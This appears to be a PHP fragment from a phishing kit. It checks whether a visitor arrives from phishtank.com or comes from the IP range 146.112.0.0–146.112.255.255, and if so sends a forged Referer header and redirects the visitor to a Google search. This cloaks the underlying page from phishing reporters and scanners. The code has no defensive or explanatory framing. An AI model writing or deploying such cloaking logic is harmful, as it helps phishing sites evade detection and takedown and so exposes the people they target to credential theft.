<?php

if(isset($_SERVER['HTTP_REFERER'])) {
	if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
		header('Referer: '.$settings['referer']);
		header('Location: https://www.google.com/search?q='.$settings['out']);;
	}
}

if(isset($_SERVER['HTTP_REFERER'])) {
	if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
		header('Referer: '.$settings['referer']);
		header('Location: https://www.google.com/search?q='.$settings['out']);
	}
}

$range_start = ip2long("146.112.0.0");
$range_end   = ip2long("146.112.255.255");
$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);
if ($ip2long >= $range_start && $ip2long <= $range_end){
	header('Referer: '.$settings['referer']);
	header('Location: https://www.google.com/search?q='.$settings['out']);
}

?>